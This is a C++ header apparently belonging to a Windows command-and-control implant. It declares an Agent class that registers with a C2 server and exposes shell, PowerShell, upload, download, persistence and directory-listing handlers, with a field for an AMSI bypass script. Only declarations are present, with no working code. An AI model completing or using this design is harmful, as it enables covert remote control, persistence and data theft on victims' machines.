#include <iostream>
#include <vector>
#include <string>
#include <map>
#include <Windows.h>
#include <winhttp.h>
#include <numeric>
#include "Config.h"

#pragma comment(lib, "winhttp.lib")

class Agent {

private:

	// command handler.
	std::string HandlerURI;
	std::string ComputerName;
	std::string AgentID; // MD5 of computername or something
	std::string ipAddress;
	std::string CurDir = "C:\\"; // current directory. ( for ls )
	unsigned int port;

	std::string PsScript = "";
	std::string PsAMSIBypass = "";

public:
	void Register(std::string ip, unsigned int port);
	// ip/port for c2server
	std::string Get(std::wstring path);
	std::string Post(std::string_view path, std::string_view data);
	//std::vector<std::string> GetArgs();
	static void shell(std::vector<std::string> args);
	static void powershell(std::vector<std::string> args);
	//static void psimport(std::vector<std::string> args);
	static void upload(std::vector<std::string> args);
	static void download(std::vector<std::string> args);
	static void persist(std::vector<std::string> args);
	static void listdir(std::vector<std::string> args);
};